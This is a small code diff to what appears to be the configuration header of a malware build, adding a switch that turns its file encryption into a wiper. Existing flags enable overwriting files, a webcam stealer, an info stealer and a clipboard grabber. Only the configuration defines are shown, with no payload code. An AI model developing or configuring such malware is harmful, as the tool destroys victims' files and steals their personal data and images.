@@ -60,6 +60,7 @@
 #define CHANGE_FILE_ICON	false	// Enable or disable custom icon for encrypted files
 #define OVERWRITING			true	// Enable or disable overwriting files instead of writing and deleting
 #define FILE_UPLOADER		false	// Enable or disable file uploader
+#define WIPER				false	// Enable or disable wiper instead of crypter
 #define TAKE_WEBCAMS		true	// Enable or disable webcam stealer
 #define STEAL_INFO			true	// Enable or disable info stealer
 #define GET_CLIPBOARD		true	// Enable or disable clipboard grabber
